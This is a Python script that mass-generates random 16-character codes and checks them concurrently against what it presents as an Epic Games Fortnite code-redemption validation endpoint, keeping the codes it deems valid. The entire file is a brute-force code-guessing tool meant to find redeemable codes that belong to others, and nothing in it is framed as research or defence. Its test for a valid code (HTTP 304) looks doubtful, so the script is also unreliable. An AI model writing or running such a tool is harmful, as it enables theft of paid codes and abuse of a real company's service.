import random
import requests
import concurrent.futures

def generate_code():
    return ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(16))

def check_code(code):
    url = f"https://www.epicgames.com/fortnite/ajax/redemption/validate-redemption-code?redeem-code={code}"
    try:
        r = requests.get(url)
        if r.status_code == 304:
            return code, "valid"
        else:
            return code, "invalid"
    except requests.RequestException:
        return code, "error"

def generate_and_check_codes(num_codes, num_threads):
    codes = [generate_code() for _ in range(num_codes)]
    valid_codes = []
    error_codes = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_code = {executor.submit(check_code, code): code for code in codes}
        for future in concurrent.futures.as_completed(future_to_code):
            code, status = future.result()
            if status == "valid":
                valid_codes.append(code)
            elif status == "error":
                error_codes.append(code)
    return valid_codes, error_codes
